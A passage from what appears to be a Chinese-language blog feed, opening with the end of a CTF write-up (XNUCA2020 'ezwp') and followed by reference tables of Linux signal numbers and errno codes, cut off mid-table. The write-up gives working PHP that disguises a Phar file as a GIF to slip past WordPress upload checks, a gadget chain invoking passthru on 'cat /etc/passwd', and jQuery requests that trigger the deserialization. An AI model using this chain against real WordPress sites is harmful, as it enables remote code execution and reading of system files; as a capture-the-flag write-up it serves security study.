id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><p>首先需要生成一个 Phar 文件，但是 WordPress 并不傻，Phar 这种很容易被反序列化的文件 WordPress 肯定是不让直接上传的，因此这里就需要先将 Phar 文件伪装成 gif 文件之后才可以直接上传，但是序列化后的字符串还存在与该 gif 文件中，在 phar 伪协议读取该 gif 文件的时候仍旧可以触发反序列化。另外 WordPress 会拦截上传文件中的 php 代码，如果直接将 <code>&lt;?php __HALT_COMPILER(); ?&gt;</code> 写入 gif 文件中会被 WordPress 拦截，因此可以使用短标签即可绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Requests_Utility_FilteredIterator</span> <span class="keyword">extends</span> <span class="title">ArrayIterator</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$callback</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$callback</span></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;callback = <span class="variable">$callback</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ai1ec_Shutdown_Controller</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$_preserve</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_preserve = <span class="keyword">new</span> <span class="title class_">Requests_Utility_FilteredIterator</span>(<span class="keyword">array</span>(<span class="string">&#x27;cat /etc/passwd&#x27;</span>), <span class="string">&#x27;passthru&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;a.gif&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;a.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;? __HALT_COMPILER(); ?&gt;&quot;</span>);  <span class="comment">// Short tag.</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="keyword">new</span> <span class="title class_">Ai1ec_Shutdown_Controller</span>());</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="title function_ invoke__">rename</span>(<span class="string">&#x27;a.phar&#x27;</span>, <span class="string">&#x27;a.gif&#x27;</span>);</span><br></pre></td></tr></table></figure><p>生成好 gif 以后上传该文件，上传成功以后就可以拿到该文件的 id。</p><p><img src="/2020/12/10/XNUCA2020-ezwp-Writeup/3.png"></p><p>WordPress 为了防御 CSRF，在每一个页面都加入了一个 nonce 以及对 referer 的验证，所以我们还需要拿到 nonce 才能发送 post 请求。注意每个页面的 nonce 都不同，这里需要 edit 页面的 nonce，如下所示。</p><p><img src="/2020/12/10/XNUCA2020-ezwp-Writeup/4.png"></p><p><img src="/2020/12/10/XNUCA2020-ezwp-Writeup/5.png"></p><p>为了避免登陆 cookie 的麻烦，直接使用 ajax 发送请求，当然使用 python 也可以，将下面的 exp 配置修改完成后粘贴到浏览器控制台执行即可，如果下面的 exp 返回了错误的结果（例如 403），那么可能是由于 nonce 或者 id 错误。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> nonce = <span class="string">&quot;37e43b20f4&quot;</span></span><br><span class="line"><span class="keyword">var</span> id = <span class="string">&quot;9&quot;</span></span><br><span class="line"><span class="keyword">var</span> thumb = <span class="string">&quot;phar://../wp-content/uploads/2020/12/a.gif/test.txt&quot;</span></span><br><span class="line"><span class="keyword">var</span> ip = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line"><span class="comment">// var ip = &quot;172.16.9.51&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// _wp_attached_file</span></span><br><span class="line"><span class="keyword">var</span> settings = &#123;</span><br><span class="line">    <span class="string">&quot;url&quot;</span>: <span class="string">&quot;http://&quot;</span> + ip + <span class="string">&quot;/wp-admin/post.php&quot;</span>,</span><br><span class="line">    <span class="string">&quot;method&quot;</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">    <span class="string">&quot;data&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;_wpnonce&quot;</span>: nonce,</span><br><span class="line">        <span class="string">&quot;_wp_http_referer&quot;</span>: <span class="string">&quot;/wp-admin/post.php?post=&quot;</span> + id +<span class="string">&quot;&amp;action=edit&quot;</span>,</span><br><span class="line">        <span class="string">&quot;action&quot;</span>: <span class="string">&quot;editpost&quot;</span>,</span><br><span class="line">        <span class="string">&quot;post_type&quot;</span>:<span class="string">&quot;attachment&quot;</span>,</span><br><span class="line">        <span class="string">&quot;post_ID&quot;</span>:id,</span><br><span class="line">        <span class="string">&quot;file&quot;</span>:<span class="string">&quot;Z:\\Z&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">jQuery.<span class="title function_">ajax</span>(settings).<span class="title function_">done</span>(<span class="keyword">function</span> (<span class="params">response</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(response);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// _wp_attachment_metadata</span></span><br><span class="line"><span class="keyword">var</span> settings = &#123;</span><br><span class="line">    <span class="string">&quot;url&quot;</span>: <span class="string">&quot;http://&quot;</span> + ip + <span class="string">&quot;/wp-admin/post.php&quot;</span>,</span><br><span class="line">    <span class="string">&quot;method&quot;</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">    <span class="string">&quot;data&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;_wpnonce&quot;</span>: nonce,</span><br><span class="line">        <span class="string">&quot;_wp_http_referer&quot;</span>: <span class="string">&quot;/wp-admin/post.php?post=&quot;</span> + id +<span class="string">&quot;&amp;action=edit&quot;</span>,</span><br><span class="line">        <span class="string">&quot;action&quot;</span>: <span class="string">&quot;editattachment&quot;</span>,</span><br><span class="line">        <span class="string">&quot;post_ID&quot;</span>:id,</span><br><span class="line">        <span class="string">&quot;thumb&quot;</span>:thumb</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">jQuery.<span class="title function_">ajax</span>(settings).<span class="title function_">done</span>(<span class="keyword">function</span> (<span class="params">response</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(response);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>上面的 exp 执行完成后_wp_attachment_metadata 与_wp_attached_file 字段就修改完成了。</p><p><img src="/2020/12/10/XNUCA2020-ezwp-Writeup/7.png"></p><p>最后访问页面 <code>/wp-admin/media.php?attachment_id=9&amp;action=edit</code> 就可以触发反序列化执行命令获取输出。</p><p><img src="/2020/12/10/XNUCA2020-ezwp-Writeup/6.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Signal CheatSheet</title>
      <link href="/2020/10/26/Signal-CheatSheet/"/>
      <url>/2020/10/26/Signal-CheatSheet/</url>
      
        <content type="html"><![CDATA[<h1 id="0x0-Linux-signals"><a href="#0x0-Linux-signals" class="headerlink" title="0x0 Linux signals"></a>0x0 Linux signals</h1><table><thead><tr><th align="center">number</th><th align="center">hex</th><th>symbol</th><th>description</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">0x01</td><td>SIGHUP</td><td>Hangup</td></tr><tr><td align="center">2</td><td align="center">0x02</td><td>SIGINT</td><td>Interrupt</td></tr><tr><td align="center">3</td><td align="center">0x03</td><td>SIGQUIT</td><td>Quit</td></tr><tr><td align="center">4</td><td align="center">0x04</td><td>SIGILL</td><td>Illegal instruction</td></tr><tr><td align="center">5</td><td align="center">0x05</td><td>SIGTRAP</td><td>Trace/breakpoint trap</td></tr><tr><td align="center">6</td><td align="center">0x06</td><td>SIGABRT</td><td>Aborted</td></tr><tr><td align="center">6</td><td align="center">0x06</td><td>SIGIOT</td><td><em>(Same value as SIGABRT)</em> Aborted</td></tr><tr><td align="center">7</td><td align="center">0x07</td><td>SIGBUS</td><td>Bus error</td></tr><tr><td align="center">8</td><td align="center">0x08</td><td>SIGFPE</td><td>Floating point exception</td></tr><tr><td align="center">9</td><td align="center">0x09</td><td>SIGKILL</td><td>Killed</td></tr><tr><td align="center">10</td><td align="center">0x0a</td><td>SIGUSR1</td><td>User defined signal 1</td></tr><tr><td align="center">11</td><td align="center">0x0b</td><td>SIGSEGV</td><td>Segmentation fault</td></tr><tr><td align="center">12</td><td align="center">0x0c</td><td>SIGUSR2</td><td>User defined signal 2</td></tr><tr><td align="center">13</td><td align="center">0x0d</td><td>SIGPIPE</td><td>Broken pipe</td></tr><tr><td align="center">14</td><td align="center">0x0e</td><td>SIGALRM</td><td>Alarm clock</td></tr><tr><td align="center">15</td><td align="center">0x0f</td><td>SIGTERM</td><td>Terminated</td></tr><tr><td align="center">16</td><td align="center">0x10</td><td>SIGSTKFLT</td><td>Stack fault</td></tr><tr><td align="center">17</td><td align="center">0x11</td><td>SIGCHLD</td><td>Child exited</td></tr><tr><td align="center">17</td><td align="center">0x11</td><td>SIGCLD</td><td><em>(Same value as SIGCHLD)</em> Child exited</td></tr><tr><td align="center">18</td><td align="center">0x12</td><td>SIGCONT</td><td>Continued</td></tr><tr><td align="center">19</td><td align="center">0x13</td><td>SIGSTOP</td><td>Stopped (signal)</td></tr><tr><td align="center">20</td><td align="center">0x14</td><td>SIGTSTP</td><td>Stopped</td></tr><tr><td align="center">21</td><td align="center">0x15</td><td>SIGTTIN</td><td>Stopped (tty input)</td></tr><tr><td align="center">22</td><td align="center">0x16</td><td>SIGTTOU</td><td>Stopped (tty output)</td></tr><tr><td align="center">23</td><td align="center">0x17</td><td>SIGURG</td><td>Urgent I/O condition</td></tr><tr><td align="center">24</td><td align="center">0x18</td><td>SIGXCPU</td><td>CPU time limit exceeded</td></tr><tr><td align="center">25</td><td align="center">0x19</td><td>SIGXFSZ</td><td>File size limit exceeded</td></tr><tr><td align="center">26</td><td align="center">0x1a</td><td>SIGVTALRM</td><td>Virtual timer expired</td></tr><tr><td align="center">27</td><td align="center">0x1b</td><td>SIGPROF</td><td>Profiling timer expired</td></tr><tr><td align="center">28</td><td align="center">0x1c</td><td>SIGWINCH</td><td>Window changed</td></tr><tr><td align="center">29</td><td align="center">0x1d</td><td>SIGPOLL</td><td>I/O possible</td></tr><tr><td align="center">29</td><td align="center">0x1d</td><td>SIGIO</td><td><em>(Same value as SIGPOLL)</em> I/O possible</td></tr><tr><td align="center">30</td><td align="center">0x1e</td><td>SIGPWR</td><td>Power failure</td></tr><tr><td align="center">31</td><td align="center">0x1f</td><td>SIGSYS</td><td>Bad system call</td></tr><tr><td align="center">32</td><td align="center">0x20</td><td>SIGRTMIN-2</td><td>Real-time signal reserved by the C library for NPTL; see [signal(7)]</td></tr><tr><td align="center">33</td><td align="center">0x21</td><td>SIGRTMIN-1</td><td>Real-time signal reserved by the C library for NPTL; see [signal(7)]</td></tr><tr><td align="center">34</td><td align="center">0x22</td><td>SIGRTMIN</td><td>Real-time signal 0</td></tr><tr><td align="center">35</td><td align="center">0x23</td><td>SIGRTMIN+1</td><td>Real-time signal 1</td></tr><tr><td align="center">36</td><td align="center">0x24</td><td>SIGRTMIN+2</td><td>Real-time signal 2</td></tr><tr><td align="center">37</td><td align="center">0x25</td><td>SIGRTMIN+3</td><td>Real-time signal 3</td></tr><tr><td align="center">38</td><td align="center">0x26</td><td>SIGRTMIN+4</td><td>Real-time signal 4</td></tr><tr><td align="center">39</td><td align="center">0x27</td><td>SIGRTMIN+5</td><td>Real-time signal 5</td></tr><tr><td align="center">40</td><td align="center">0x28</td><td>SIGRTMIN+6</td><td>Real-time signal 6</td></tr><tr><td align="center">41</td><td align="center">0x29</td><td>SIGRTMIN+7</td><td>Real-time signal 7</td></tr><tr><td align="center">42</td><td align="center">0x2a</td><td>SIGRTMIN+8</td><td>Real-time signal 8</td></tr><tr><td align="center">43</td><td align="center">0x2b</td><td>SIGRTMIN+9</td><td>Real-time signal 9</td></tr><tr><td align="center">44</td><td align="center">0x2c</td><td>SIGRTMIN+10</td><td>Real-time signal 10</td></tr><tr><td align="center">45</td><td align="center">0x2d</td><td>SIGRTMIN+11</td><td>Real-time signal 11</td></tr><tr><td align="center">46</td><td align="center">0x2e</td><td>SIGRTMIN+12</td><td>Real-time signal 12</td></tr><tr><td align="center">47</td><td align="center">0x2f</td><td>SIGRTMIN+13</td><td>Real-time signal 13</td></tr><tr><td align="center">48</td><td align="center">0x30</td><td>SIGRTMIN+14</td><td>Real-time signal 14</td></tr><tr><td align="center">49</td><td align="center">0x31</td><td>SIGRTMIN+15</td><td>Real-time signal 15</td></tr><tr><td align="center">50</td><td align="center">0x32</td><td>SIGRTMAX-14</td><td>Real-time signal 16</td></tr><tr><td align="center">51</td><td align="center">0x33</td><td>SIGRTMAX-13</td><td>Real-time signal 17</td></tr><tr><td align="center">52</td><td align="center">0x34</td><td>SIGRTMAX-12</td><td>Real-time signal 18</td></tr><tr><td align="center">53</td><td align="center">0x35</td><td>SIGRTMAX-11</td><td>Real-time signal 19</td></tr><tr><td align="center">54</td><td align="center">0x36</td><td>SIGRTMAX-10</td><td>Real-time signal 20</td></tr><tr><td align="center">55</td><td align="center">0x37</td><td>SIGRTMAX-9</td><td>Real-time signal 21</td></tr><tr><td align="center">56</td><td align="center">0x38</td><td>SIGRTMAX-8</td><td>Real-time signal 22</td></tr><tr><td align="center">57</td><td align="center">0x39</td><td>SIGRTMAX-7</td><td>Real-time signal 23</td></tr><tr><td align="center">58</td><td align="center">0x3a</td><td>SIGRTMAX-6</td><td>Real-time signal 24</td></tr><tr><td align="center">59</td><td align="center">0x3b</td><td>SIGRTMAX-5</td><td>Real-time signal 25</td></tr><tr><td align="center">60</td><td align="center">0x3c</td><td>SIGRTMAX-4</td><td>Real-time signal 26</td></tr><tr><td align="center">61</td><td align="center">0x3d</td><td>SIGRTMAX-3</td><td>Real-time signal 27</td></tr><tr><td align="center">62</td><td align="center">0x3e</td><td>SIGRTMAX-2</td><td>Real-time signal 28</td></tr><tr><td align="center">63</td><td align="center">0x3f</td><td>SIGRTMAX-1</td><td>Real-time signal 29</td></tr><tr><td align="center">64</td><td align="center">0x40</td><td>SIGRTMAX</td><td>Real-time signal 30</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> CheatSheet </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Errorno CheatSheet</title>
      <link href="/2020/10/26/Errorno-CheatSheet/"/>
      <url>/2020/10/26/Errorno-CheatSheet/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux-errorno"><a href="#Linux-errorno" class="headerlink" title="Linux errorno"></a>Linux errorno</h1><table><thead><tr><th align="center">number</th><th align="center">hex</th><th>symbol</th><th>description</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">0x01</td><td>EPERM</td><td>Operation not permitted</td></tr><tr><td align="center">2</td><td align="center">0x02</td><td>ENOENT</td><td>No such file or directory</td></tr><tr><td align="center">3</td><td align="center">0x03</td><td>ESRCH</td><td>No such process</td></tr><tr><td align="center">4</td><td align="center">0x04</td><td>EINTR</td><td>Interrupted system call</td></tr><tr><td align="center">5</td><td align="center">0x05</td><td>EIO</td><td>Input/output error</td></tr><tr><td align="center">6</td><td align="center">0x06</td><td>ENXIO</td><td>No such device or address</td></tr><tr><td align="center">7</td><td align="center">0x07</td><td>E2BIG</td><td>Argument list too long</td></tr><tr><td align="center">8</td><td align="center">0x08</td><td>ENOEXEC</td><td>Exec format error</td></tr><tr><td align="center">9</td><td align="center">0x09</td><td>EBADF</td><td>Bad file descriptor</td></tr><tr><td align="center">10</td><td align="center">0x0a</td><td>ECHILD</td><td>No child processes</td></tr><tr><td align="center">11</td><td align="center">0x0b</td><td>EAGAIN</td><td>Resource temporarily unavailable</td></tr><tr><td align="center">11</td><td align="center">0x0b</td><td>EWOULDBLOCK</td><td><em>(Same value as EAGAIN)</em> Resource temporarily unavailable</td></tr><tr><td align="center">12</td><td align="center">0x0c</td><td>ENOMEM</td><td>Cannot allocate memory</td></tr><tr><td align="center">13</td><td align="center">0x0d</td><td>EACCES</td><td>Permission denied</td></tr><tr><td align="center">14</td><td align="center">0x0e</td><td>EFAULT</td><td>Bad address</td></tr><tr><td align="center">15</td><td align="center">0x0f</td><td>ENOTBLK</td><td>Block device required</td></tr><tr><td align="center">16</td><td align="center">0x10</td><td>EBUSY</td><td>Device or resource busy</td></tr><tr><td align="center">17</td><td align="center">0x11</td><td>EEXIST</td><td>File exists</td></tr><tr><td align="center">18</td><td align="center">0x12</td><td>EXDEV</td><td>Invalid cross-device link</td></tr><tr><td align="center">19</td><td align="center">0x13</td><td>ENODEV</td><td>No such device</td></tr><tr><td align="center">20</td><td align="center">0x14</td><td>ENOTDIR</td><td>Not a directory</td></tr><tr><td align="center">21</td><td align="center">0x15</td><td>EISDIR</td><td>Is a directory</td></tr><tr><td align="center">22</td><td align="center">0x16</td><td>EINVAL</td><td>Invalid argument</td></tr><tr><td align="center">23</td><td align="center">0x17</td><td>ENFILE</td><td>Too many open files in system</td></tr><tr><td align="center">24</td><td align="center">0x18</td><td>EMFILE</td><td>Too many open files</td></tr><tr><td align="center">25</td><td align="center">0x19</td><td>ENOTTY</td><td>Inappropriate ioctl for device</td></tr><tr><td align="center">26</td><td align="center">0x1a</td><td>ETXTBSY</td><td>Text file busy</td></tr><tr><td align="center">27</td><td align="center">0x1b</td><td>EFBIG</td><td>File too large</td></tr><tr><td align="center">28</td><td align="center">0x1c</td><td>ENOSPC</td><td>No space left on device</td></tr><tr><td align="center">29</td><td align="center">0x1d</td><td>ESPIPE</td><td>Illegal seek</td></tr><tr><td align="center">30</td><td align="center">0x1e</td><td>EROFS</td><td>Read-only file system</td></tr><tr><td align="center">31</td><td align="center">0x1f</td><td>EMLINK</td><td>Too many links</td></tr><tr><td align="center">32</td><td align="center">0x20</td><td>EPIPE</td><td>Broken pipe</td></tr><tr><td align="center">33</td><td align="center">0x21</td><td>EDOM</td><td>Numerical argument out of domain</td></tr><tr><td align="center">34</td><td align="center">0x22</td><td>ERANGE</td><td>Numerical result out of range</td></tr><tr><td align="center">35</td><td align="center">0x23</td><td>EDEADLK</td><td>Resource deadlock avoided</td></tr><tr><td align="center">35</td><td align="center">0x23</td><td>EDEADLOCK</td><td><em>(Same value as EDEADLK)</em> Resource deadlock avoided</td></tr><tr><td align="center">36</td><td align="center">0x24</td><td>ENAMETOOLONG</td><td>File name too long</td></tr><tr><td align="center">37</td><td align="center">0x25</td><td>ENOLCK</td><td>No locks available</td></tr><tr><td align="center">38</td><td align="center">0x26</td><td>ENOSYS</td><td>Function not implemented</td></tr><tr><td align="center">39</td><td align="center">0x27</td><td>ENOTEMPTY</td><td>Directory not empty</td></tr><tr><td align="center">40</td><td align="center">0x28</td><td>ELOOP</td><td>Too many levels of symbolic links</td></tr><tr><td align="center">41</td><td align="center">0x29</td><td></td><td><em>not implemented</em></td></tr><tr><td align="center">42</td><td align="center">0x2a</td><td>ENOMSG</td><td>No message of desired type</td></tr><tr><td align="center">43</td><td align="center">0x2b</td><td>EIDRM</td><td>Identifier removed</td></tr><tr><td align="center">44</td><td align="center">0x2c</td><td>ECHRNG</td><td>Channel number out of range</td></tr><tr><td align="center">45</td><td align="center">0x2d</td><td>EL2NSYNC</td><td>Level 2 not synchronized</td></tr><tr><td align="center">46</td><td align="center">0x2e</td><td>EL3HLT</td><td>Level 3 halted</td></tr><tr><td align="center">47</td><td align="center">0x2f</td><td>EL3RST</td><td>Level 3 reset</td></tr><tr><td align="center">48</td><td align="center">0x30</td><td>ELNRNG</td><td>Link number out of range</td></tr><tr><td align="center">49</td><td align="center">0x31</td><td>EUNATCH</td><td>Protocol driver not attached</td></tr><tr><td align="center">50</td><td align="center">0x32</td><td>ENOCSI</td><td>No CSI structure available</td></tr><tr><td align="center">51</td><td align="center">0x33</td><td>EL2HLT</td><td>Level 2 halted</td></tr><tr><td align="center">52</td><td align="center">0x34</td><td>EBADE</td><td>Invalid exchange</td></tr><tr><td align="center">53</td><td align="center">0x35</td><td>EBADR</td><td>Invalid request descriptor</td></tr><tr><td align="center">54</td><td align="center">0x36</td><td>EXFULL</td><td>Exchange full</td></tr><tr><td align="center">55</td><td align="center">0x37</td><td>ENOANO</td><td>No anode</td></tr><tr><td align="center">56</td><td align="center">0x38</td><td>EBADRQC</td><td>Invalid request code</td></tr><tr><td align="center">57</td><td align="center">0x39</td><td>EBADSLT</td><td>Invalid slot</td></tr><tr><td align="center">58</td><td align="center">0x3a</td><td></td><td><em>not implemented</em></td></tr><tr><td align="center">59</td><td align="center">0x3b</td><td>EBFONT</td><td>Bad font file format</td></tr><tr><td align="center">60</td><td align="center">0x3c</td><td>ENOSTR</td><td>Device not a stream</td></tr><tr><td align="center">61</td><td align="center">0x3d</td><td>ENODATA</td><td>No data available</td></tr><tr><td align="center">62</td><td align="center">0x3e</td><td>ETIME</td><td>Timer expired</td></tr><tr><td align="center">63</td><td align="center">0x3f</td><td>ENOSR</td><td>Out of streams resources</td></tr><tr><td align="center">64</td><td align="center">0x40</td><td>ENONET</td><td>Machine is not on the network</td></tr><tr><td align="center">65</td><td align="center">0x41</td><td>ENOPKG</td><td>Package not installed</td></tr><tr><td align="center">66</td><td align="center">0x42</td><td>EREMOTE</td><td>Object is remote</td></tr><tr><td align="center">67</td><td align="center">0x43</td><td>ENOLINK</td><td>Link has been severed</td></tr><tr><td align="center">68</td><td align="center">0x44</td><td>EADV</td><td>Advertise error</td></tr><tr><td align="center">69</td><td align="center">0x45</td><td>ESRMNT</td><td>Srmount error</td></tr><tr><td align="center">70</td><td align="center">0x46</td><td>ECOMM</td><td>Communication error on send</td></tr><tr><td align="center">71</td><td align="center">0x47</td><td>EPROTO</td><td>Protocol error</td></tr><tr><td align="center">72</td><td align="center">0x48</td><td>EMULTIHOP</td><td>Multihop attempted</td></tr><tr><td align="center">73</td><td align="center">0x49</td><td>EDOTDOT</td><td>RFS specific error</td></tr><tr><td align="center">74</td><td align="center">0x4a</td><td>EBADMSG</td><td>Bad message</td></tr><tr><td align="center">75</td><td align="center">0x4b</td><td>EOVERFLOW</td><td>Value too large for defined data type</td></tr><tr><td align="center">76</td><td align="center">0x4c</td><td>ENOTUNIQ</td><td>Name not unique on network</td></tr><tr><td align="center">77</td><td align="center">0x4d</td><td>EBADFD</td><td>File descriptor in bad state</td></tr><tr><td align="center">78</td><td align="center">0x4e</td><td>EREMCHG</td><td>Remote address changed</td></tr><tr><td align="center">79</td><td align="center">0x4f</td><td>ELIBACC</td><td>Can not access a needed shared library</td></tr><tr><td align="center">80</td><td align="center">0x50</td><td>ELIBBAD</td><td>Accessing a corrupted shared library</td></tr><tr><td align="center">81</td><td align="center">0x51</td><td>ELIBSCN</td><td>.lib section in a.out corrupted</td></tr><tr><td align="center">82</td><td align="center">0x52</td><td>ELIBMAX</td><td>Attempting to link in too many shared libraries</td></tr><tr><td align="center">83</td><td align="center">0x53</td><td>ELIBEXEC</td><td>Cannot exec a shared library directly</td></tr><tr><td align="center">84</td><td align="center">0x54</td><td>EILSEQ</td><td>Invalid or incomplete multibyte or wide character</td></tr><tr><td align="center">85</td><td align="center">0x55</td><td>ERESTART</td><td>Interrupted system call should be restarted</td></tr><tr><td align="center">86</td><td align="center">0x56</td><td>ESTRPIPE</td><td>Streams pipe error</td></tr><tr><td align="center">87</td><td align="center">0x57</td><td>EUSERS</td><td>Too many users</td></tr><tr><td align="center">88</td><td align="center">0x58</td><td>ENOTSOCK</td><td>Socket operation on non-socket</td></tr><tr><td align="center">89</td><td align="center">0x59</td><td>EDESTADDRREQ</td><td>Destination address required</td></tr><tr><td align="center">90</td><td align="center">0x5a</td><td>EMSGSIZE</td><td>Message too long</td></tr><tr><td align="center">91</td><td align="center">0x5b</td><td>EPROTOTYPE</td><td>Protocol wrong type for socket</td></tr><tr><td align="center">92</td><td align="center">0x5c</td><td>ENOPROTOOPT</td><td>Protocol not available</td></tr><tr><td align="center">93</td><td align="center">0x5d</td><td>EPROTONOSUPPORT</td><td>Protocol not supported</td></tr><tr><td align="center">94</td><td align="center">0x5e</td><td>ESOCKTNOSUPPORT</td><td>Socket type not supported</td></tr><tr><td align="center">95</td><td align="center">0x5f</td><td>EOPNOTSUPP</td><td>Operation not supported</td></tr><tr><td align="center">95</td><td align="center">0x5f</td><td>ENOTSUP</td><td><em>(Same value as EOPNOTSUPP)</em> Operation not supported</td></tr><tr><td align="center">96</td><td align="center">0x60</td><td>EPFNOSUPPORT</td><td>Protocol family not supported</td></tr><tr><td align="center">97</td><td align="center">0x61</td><td>EAFNOSUPPORT</td><td>Address family not supported by protocol</td></tr><tr><td align="center">98</td><td align="center">0x62</td><td>EADDRINUSE</td><td>Address already in use</td></tr><tr><td align="center">99</td><td align="center">0x63</td><td>EADDRNOTAVAIL</td><td>Cannot assign requested address</td></tr><tr><td align="center">100</td><td align="center">0x64</td><td>ENETDOWN</td><td>Network is down</td></tr><tr><td align="center">101</td><td align="center">0x65</td><td>ENETUNREACH</td><td>Network is unreachable</td></tr><tr><td align="center">102</td><td align="center">0x66</td><td>ENETRESET</td><td>Network dropped connection on reset</td></tr><tr><td align="center">103</td><td align="center">0x67</td><td>ECONNABORTED</td><td>Software caused connection abort</td></tr><tr><td align="center">104</td><td align="center">0x68</td><td>ECONNRESET</td><td>Connection reset by peer</td></tr><tr><td align="center">105</td><td align="center">0x69</td><td>ENOBUFS</td><td>No buffer space available</td></tr><tr><td align="center">106</td><td align="center">0x6a</td><td>EISCONN</td><td>Transport endpoint is already connected</td></tr><tr><td align="center">107</td><td align="center">0x6b</td><td>ENOTCONN</td><td>Transport endpoint is not connected</td></tr><tr><td align="center">108</td><td align="center">0x6c</td><td>ESHUTDOWN</td><td>Cannot send after transport endpoint shutdown</td></tr><tr><td align="center">109</td><td align="center">0x6d</td><td>ETOOMANYREFS</td><td>Too many references: cannot splice</td></tr><tr><td align="center">110</td><td align="center">0x6e</td><td>ETIMEDOUT</td><td>Connection timed out</td></tr><tr><td align="center">111</td><td align="center">0x6f</td><td>ECONNREFUSED</td><td>Connection refused</td></tr><tr><td align="center">112</td><td align="center">0x70</td><td>EHOSTDOWN</td><td>Host is down</td></tr><tr><td align="center">113</td><td align="center">0x71</td><td>EHOSTUNREACH</td><td>No route to host</td></tr><tr><td align="center">114</td><td align="center">0x72</td><td>EALREADY</td><td>Operation already in progress</td></tr><tr><td align="center">115</td><td align="center">0x73</td><td>EINPROGRESS</td><td>Operation now in progress</td></tr><tr><td align="center">116</td><td align="center">0x74</td><td>ESTALE</td><td>Stale file handle</td></tr><tr><td align="center">117</td><td align="center">0x75</td><td>EUCLEAN</td><td>Structure needs cleaning</td></tr><tr><td align="center">118</td><td align="center">0x76</td><td>ENOTNAM</td><td>Not a XENIX named type file</td></tr><tr><td align="center">119</td><td align="center">0x77</td><td>ENAVAIL</td><td>No XENIX semaphores available</td></tr><tr><td align="center">120</td><td align="center">0x78</td><td>EISNAM</td><td>Is a named type file</td></tr><tr><td align="center">121</td><td align="center">0x79</td><td>EREMOTEIO</td><td>Remote I/O 